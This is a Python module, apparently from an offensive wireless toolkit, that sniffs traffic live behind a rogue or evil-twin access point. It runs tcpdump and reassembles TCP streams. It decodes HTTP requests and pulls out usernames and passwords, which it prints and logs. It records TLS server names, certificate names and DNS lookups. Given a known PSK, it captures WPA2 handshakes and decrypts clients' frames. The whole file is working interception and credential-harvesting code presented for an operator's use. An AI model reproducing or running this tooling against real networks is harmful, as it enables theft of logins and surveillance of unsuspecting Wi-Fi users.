"""Live sniffing: HTTP requests and HTTPS names as they happen.

The capture modules read a pcap *after* the fact. This one decodes while the
radio is still listening, which is what a rogue AP needs: a client joins, and
seconds later the operator sees

    http  POST http://intranet.test/login  bob / pw123
    tls   bank.example.com  (93.184.216.34)

Every layer is the stack the offline modules already use — :class:`pcapread.Reader`
for the pcap stream, :func:`pcapread.network_payload` for the link layer,
:class:`omni.wifi.http.Decoder` for TCP, :func:`omni.wifi.extract.parse_sni`
for the handshake — so live and offline answers agree by construction.

Two capture shapes are handled:

* an AP or uplink interface (``tcpdump -i wlan0``): Ethernet / Linux-cooked
  frames, i.e. what clients push *through* the twin — already plaintext;
* a monitor interface: 802.11, CCMP-protected, and unreadable unless the PSK
  is known. With ``PSK=`` (plus the SSID, or the beacons say it) the 4-way
  handshake is caught live, the PTK derived per station and the frames
  decrypted in memory — that is how a WPA2 twin shows plaintext at all.
"""

from __future__ import annotations

import json
import os
import subprocess
import threading
import time

from omni.core import console
from omni.wifi import ccmp, extract, http, pcapread, tlsmeta, wpa

__all__ = ["Event", "Keys", "Flow", "Sniffer", "LINK_NAMES", "TLS_PORTS",
           "live_printer"]

#: ports whose payload is worth a TLS record parse
TLS_PORTS = (443, 465, 587, 993, 995, 5061, 8443, 8883, 9443)

#: a pcap read at a time; tcpdump flushes per packet, so chunks are small
READ_CHUNK = 65536

#: stop tracking conversations past this many, rather than growing forever
MAX_FLOWS = 2048

LINK_NAMES = {
    pcapread.LINKTYPE_NULL: "loopback",
    pcapread.LINKTYPE_ETHERNET: "ethernet",
    pcapread.LINKTYPE_LINUX_SLL: "linux-sll",
    pcapread.LINKTYPE_80211: "802.11",
    pcapread.LINKTYPE_RADIOTAP: "802.11+radiotap",
}


def _ip(raw: bytes) -> str:
    return ".".join(str(byte) for byte in raw) if len(raw) == 4 else ""


def _mac(raw: bytes) -> str:
    return ":".join(f"{byte:02X}" for byte in raw) if len(raw) == 6 else ""


def _tcp(payload: bytes) -> tuple[int, int, int, bytes] | None:
    """(sport, dport, seq, body) from a TCP segment."""
    if len(payload) < 20:
        return None
    sport = int.from_bytes(payload[0:2], "big")
    dport = int.from_bytes(payload[2:4], "big")
    seq = int.from_bytes(payload[4:8], "big")
    offset = (payload[12] >> 4) * 4
    if offset < 20 or len(payload) <= offset:
        return None
    return sport, dport, seq, payload[offset:]


def _udp(payload: bytes) -> tuple[int, int, bytes] | None:
    """(sport, dport, body) from a UDP datagram."""
    if len(payload) < 8:
        return None
    return (int.from_bytes(payload[0:2], "big"),
            int.from_bytes(payload[2:4], "big"), payload[8:])


def live_printer(quiet: bool = False):
    """Callback that prints each event as it lands — the point of the thing."""
    def show(event: "Event") -> None:
        if quiet:
            return
        if event.kind in ("http", "creds"):
            console.ok(f"{event.kind:<6} {event.summary()}")
        elif event.kind in ("sni", "cert"):
            console.info(f"tls    {event.summary()}")
        elif event.kind == "dns":
            console.debug(f"dns    {event.summary()}")
        elif event.kind == "handshake":
            console.info(f"wpa    {event.summary()}")
    return show



class Event:
    """One interesting observation, timestamped."""

    __slots__ = ("kind", "at", "data")

    def __init__(self, kind: str, data: dict, at: float | None = None):
        self.kind, self.data = kind, dict(data)
        self.at = time.time() if at is None else at

    def summary(self) -> str:
        if self.kind == "http":
            return f"{self.data.get('method', '')} {self.data.get('url', '')}"
        if self.kind == "creds":
            return (f"{self.data.get('source', '')} "
                    f"{self.data.get('user', '')}:{self.data.get('pass', '')} "
                    f"<- {self.data.get('url', '')}")
        if self.kind == "handshake":
            return f"key derived for {self.data.get('station', '')}"
        return str(self.data.get("name", ""))

    def when(self) -> str:
        return time.strftime("%H:%M:%S", time.localtime(self.at))

    def row(self) -> list[str]:
        return [self.when(), self.kind, self.summary()]

    def as_dict(self) -> dict:
        return {"kind": self.kind, "at": round(self.at, 3), **self.data}


class Keys:
    """Live 4-way-handshake tracking: PSK + nonces -> a usable TK."""

    def __init__(self, psk: str = "", ssid: bytes = b""):
        self.psk = psk or ""
        self.ssid = ssid or b""
        self._pending: dict[tuple[bytes, bytes], dict] = {}
        self._tks: dict[tuple[bytes, bytes], bytes] = {}

    @property
    def active(self) -> bool:
        return bool(self.psk) and bool(self.ssid)

    def tk(self, ap: bytes, sta: bytes) -> bytes | None:
        return self._tks.get((ap, sta)) or self._tks.get((sta, ap))

    def note(self, frame: bytes) -> str:
        """Track one EAPOL-Key frame; name the station once a TK appears."""
        if not self.active:
            return ""
        eapol = pcapread.eapol_key(frame)
        if eapol is None:
            return ""
        key_info = int.from_bytes(eapol[5:7], "big")
        from_ap = bool(key_info & 0x0080)
        if not from_ap and not key_info & 0x0100:   # message 4 carries nothing
            return ""
        if from_ap:
            ap, sta = frame[10:16], frame[4:10]
        else:
            ap, sta = frame[4:10], frame[10:16]
        slot = self._pending.setdefault((ap, sta), {})
        nonce = eapol[17:49]
        if from_ap:
            slot.setdefault("a_nonce", nonce)
        else:
            slot.update({"s_nonce": nonce, "eapol": eapol,
                         "mic": eapol[pcapread.MIC_OFFSET:
                                      pcapread.MIC_OFFSET + pcapread.MIC_LEN],
                         "kdv": key_info & 0x07})
        if not {"a_nonce", "s_nonce", "eapol"} <= set(slot):
            return ""
        if self.tk(ap, sta) is not None:
            return ""
        handshake = wpa.Handshake(ssid=self.ssid, ap=ap, sta=sta,
                                   a_nonce=slot["a_nonce"],
                                   s_nonce=slot["s_nonce"],
                                   eapol=slot["eapol"], mic=slot["mic"],
                                   kdv=slot.get("kdv", 2))
        if not handshake.verify(self.psk):
            return ""
        derived = wpa.ptk(wpa.pmk(self.psk, self.ssid), ap, sta,
                          handshake.a_nonce, handshake.s_nonce, 512)
        self._tks[(ap, sta)] = derived[32:48]
        return f"{_mac(ap)} -> {_mac(sta)}"


class Flow:
    """One TCP direction: in-order reassembly plus an HTTP decoder.

    A live capture hands over segments the way the wire carried them —
    retransmitted, duplicated, occasionally out of order — so the decoder only
    sees bytes once they are contiguous from the first segment seen.
    """

    def __init__(self) -> None:
        self.decoder = http.Decoder()
        self.segments = 0
        self._next_seq: int | None = None
        self._queue: dict[int, bytes] = {}

    def feed(self, seq: int, payload: bytes) -> list[http.Message]:
        if not payload:
            return []
        self.segments += 1
        if self._next_seq is None:
            self._next_seq = seq
        if seq < self._next_seq:                 # retransmission
            cut = self._next_seq - seq
            if cut >= len(payload):
                return []
            payload, seq = payload[cut:], self._next_seq
        if seq > self._next_seq:                 # hole: hold it back
            if len(self._queue) < 64:
                self._queue.setdefault(seq, payload)
            return []
        out = self.decoder.feed(payload)
        self._next_seq = seq + len(payload)
        while self._queue:
            nxt = min(self._queue)
            if nxt > self._next_seq:
                break
            chunk = self._queue.pop(nxt)
            if nxt < self._next_seq:
                chunk = chunk[self._next_seq - nxt:]
            if chunk:
                out += self.decoder.feed(chunk)
                self._next_seq += len(chunk)
        return out


def _decrypt(frame: bytes, tk: bytes) -> bytes | None:
    """CCMP-decrypt one 802.11 data frame with a known TK, or None."""
    try:
        pn, cipher, _key_id = ccmp.split_ccmp_body(
            frame[pcapread.body_offset(frame):])
        return ccmp.ccmp_decrypt(cipher, tk,
                                 ccmp.ccmp_nonce(0, frame[10:16], pn),
                                 ccmp.ccmp_aad(frame))
    except (ValueError, IndexError):
        return None


class Sniffer:
    """Decode a pcap stream — live or from a file — into HTTP/HTTPS events.

    ``feed`` is the seam: hand it bytes and it hands back events, which is what
    makes the whole decoder testable without tcpdump, a radio or root.
    """

    def __init__(self, iface: str = "", pcap_path: str = "", jsonl: str = "",
                 psk: str = "", ssid: str = "", bpf: str = "",
                 on_event=None, max_events: int = 5000):
        self.iface, self.pcap_path, self.jsonl = iface, pcap_path, jsonl
        self.bpf = bpf
        self.on_event = on_event
        self.max_events = max(0, max_events)
        self.reader = pcapread.Reader()
        self.keys = Keys(psk, (ssid or "").encode("utf-8", "replace"))
        self.events: list[Event] = []
        self.messages: list[http.Message] = []
        self.hosts: dict[str, str] = {}            # name -> how it was learned
        self.creds: list[tuple[str, str, str]] = []
        self.frames = self.segments = self.decrypted = 0
        self._flows: dict[tuple, Flow] = {}
        self._seen: set[str] = set()
        self._seen_creds: set[tuple[str, str, str]] = set()
        self._pcap = None
        self._jsonl = None
        self._proc: subprocess.Popen | None = None
        self._thread: threading.Thread | None = None
        self._stop = threading.Event()

    # -- capture -----------------------------------------------------------
    def argv(self) -> list[str]:
        """The tcpdump line: pcap on stdout, no file, no buffering."""
        argv = ["tcpdump", "-i", self.iface or "any", "-U", "-s", "0",
                "-w", "-"]
        if self.bpf:
            argv.append(self.bpf)
        return argv

    def start(self) -> None:
        """Spawn tcpdump and decode its stream on a background thread."""
        self._stop.clear()
        self._proc = subprocess.Popen(self.argv(), stdout=subprocess.PIPE,
                                      stderr=subprocess.DEVNULL)
        self._thread = threading.Thread(target=self._pump, name="omni-sniff",
                                        daemon=True)
        self._thread.start()

    @property
    def running(self) -> bool:
        return self._proc is not None

    def _pump(self) -> None:
        stream = self._proc.stdout if self._proc is not None else None
        if stream is None:
            return
        fd = stream.fileno()
        try:
            while not self._stop.is_set():
                chunk = os.read(fd, READ_CHUNK)
                if not chunk:
                    break
                try:
                    self.feed(chunk)
                except pcapread.PcapError as exc:
                    console.debug(f"sniff: {exc}")
                    break
        except OSError:
            pass
        finally:
            try:
                stream.close()
            except OSError:
                pass

    def stop(self) -> None:
        self._stop.set()
        if self._proc is not None:
            try:
                self._proc.terminate()
                self._proc.wait(timeout=5)
            except (OSError, subprocess.SubprocessError):
                pass
            self._proc = None
        if self._thread is not None:
            self._thread.join(timeout=3)
            self._thread = None
        self.close()

    def close(self) -> None:
        for handle in (self._pcap, self._jsonl):
            if handle is not None:
                try:
                    handle.close()
                except OSError:
                    pass
        self._pcap = self._jsonl = None

    # -- decoding ----------------------------------------------------------
    def feed(self, chunk: bytes) -> list[Event]:
        """Decode pcap bytes; returns every event they completed."""
        if not chunk:
            return []
        if self.pcap_path and self._pcap is None:
            self._pcap = open(self.pcap_path, "wb", buffering=0)
        if self._pcap is not None:
            self._pcap.write(chunk)
        produced: list[Event] = []
        for data in self.reader.feed(chunk):
            self.frames += 1
            produced += self._frame(data)
        return produced

    def read_file(self, path: str) -> list[Event]:
        """Decode an existing capture the same way a live one is decoded."""
        produced: list[Event] = []
        with open(path, "rb") as fh:
            while True:
                chunk = fh.read(READ_CHUNK)
                if not chunk:
                    break
                produced += self.feed(chunk)
        return produced

    def _frame(self, data: bytes) -> list[Event]:
        linktype = self.reader.linktype
        if linktype in pcapread.WIFI_LINKTYPES:
            return self._wifi(data, linktype)
        payload = pcapread.network_payload(linktype, data)
        return self._ip(*payload) if payload else []

    def _wifi(self, data: bytes, linktype: int) -> list[Event]:
        frame = (pcapread.strip_radiotap(data)
                 if linktype == pcapread.LINKTYPE_RADIOTAP else data)
        if len(frame) < 24:
            return []
        produced: list[Event] = []
        beacon = pcapread.ssid_of(frame)
        if beacon is not None:
            _bssid, ssid = beacon
            if not self.keys.ssid and ssid:
                self.keys.ssid = ssid        # so PSK= alone is enough
            return produced
        station = self.keys.note(frame)
        if station:
            produced.append(self._emit(Event("handshake", {"station": station})))
        payload = pcapread.network_payload(linktype, data)
        if payload is not None:
            return produced + self._ip(*payload)
        if not frame[1] & 0x40:             # not protected: nothing to decrypt
            return produced
        pair = pcapread.addresses(frame)
        if pair is None:
            return produced
        tk = self.keys.tk(*pair)
        if tk is None:
            return produced
        plain = _decrypt(frame, tk)
        if plain is None:
            return produced
        self.decrypted += 1
        inner = pcapread.llc_ipv4(plain)
        return produced + (self._ip(*inner) if inner else [])

    def _ip(self, proto: int, src: bytes, dst: bytes,
            payload: bytes) -> list[Event]:
        if proto == 17:
            udp = _udp(payload)
            if udp is not None and 53 in udp[:2]:
                return self._dns(udp[2])
            return []
        tcp = _tcp(payload)
        if tcp is None:
            return []
        sport, dport, seq, chunk = tcp
        self.segments += 1
        if not chunk:
            return []
        produced: list[Event] = []
        if chunk[:1] == b"\x16":            # TLS record
            produced += self._tls(chunk, dst)
        key = (src, sport, dst, dport)
        flow = self._flows.get(key)
        if flow is None:
            if len(self._flows) >= MAX_FLOWS:
                self._flows.clear()
            flow = self._flows[key] = Flow()
        for message in flow.feed(seq, chunk):
            if message.is_response:
                continue
            produced += self._http(message, src, dport)
        return produced

    def _http(self, message: http.Message, client: bytes,
              port: int) -> list[Event]:
        data = message.as_dict()
        data["client"] = _ip(client)
        data["port"] = port
        self.messages.append(message)
        self._note_host(data["host"], "http")
        produced = [self._emit(Event("http", data))]
        for source, user, pwd in message.credentials():
            if (source, user, pwd) in self._seen_creds:
                continue
            self._seen_creds.add((source, user, pwd))
            self.creds.append((source, user, pwd))
            produced.append(self._emit(Event("creds", {
                "source": source, "user": user, "pass": pwd,
                "url": message.url, "client": _ip(client)})))
        return produced

    def _tls(self, payload: bytes, server: bytes) -> list[Event]:
        produced: list[Event] = []
        name = extract.parse_sni(payload)
        if name:
            self._note_host(name, "sni")
            produced.append(self._emit(Event("sni", {"name": name,
                                                     "server": _ip(server)})))
        for common in tlsmeta.cert_names(payload):
            self._note_host(common, "cert")
            produced.append(self._emit(Event("cert", {
                "name": common, "server": _ip(server)})))
        return produced

    def _dns(self, payload: bytes) -> list[Event]:
        produced: list[Event] = []
        for name in extract.parse_dns(payload):
            if name.lower() in self._seen:
                continue
            self._note_host(name, "dns")
            produced.append(self._emit(Event("dns", {"name": name})))
        return produced

    def _note_host(self, name: str, kind: str) -> None:
        clean = (name or "").lower().rstrip(".")
        if clean:
            self.hosts.setdefault(clean, kind)
            self._seen.add(clean)

    def _emit(self, event: Event) -> Event:
        """Record an event, stream it out, and hand it to the callback."""
        if not self.max_events or len(self.events) < self.max_events:
            self.events.append(event)
        if self.jsonl:
            if self._jsonl is None:
                self._jsonl = open(self.jsonl, "a", encoding="utf-8",
                                   newline="\n")
            self._jsonl.write(json.dumps(event.as_dict(), sort_keys=True) + "\n")
            self._jsonl.flush()
        if self.on_event is not None:
            try:
                self.on_event(event)
            except Exception as exc:            # noqa: BLE001 - a printer
                console.debug(f"sniff callback: {exc}")
        return event

    # -- reporting ---------------------------------------------------------
    def report(self) -> dict:
        link = LINK_NAMES.get(self.reader.linktype, "unknown")
        return {"iface": self.iface, "link": link, "frames": self.frames,
                "tcp_segments": self.segments, "decrypted": self.decrypted,
                "http": [m.as_dict() for m in self.messages],
                "hosts": sorted(self.hosts),
                "sni": sorted(n for n, k in self.hosts.items() if k == "sni"),
                "cert_cn": sorted(n for n, k in self.hosts.items()
                                  if k == "cert"),
                "dns": sorted(n for n, k in self.hosts.items() if k == "dns"),
                "creds": [list(c) for c in self.creds],
                "events": len(self.events)}
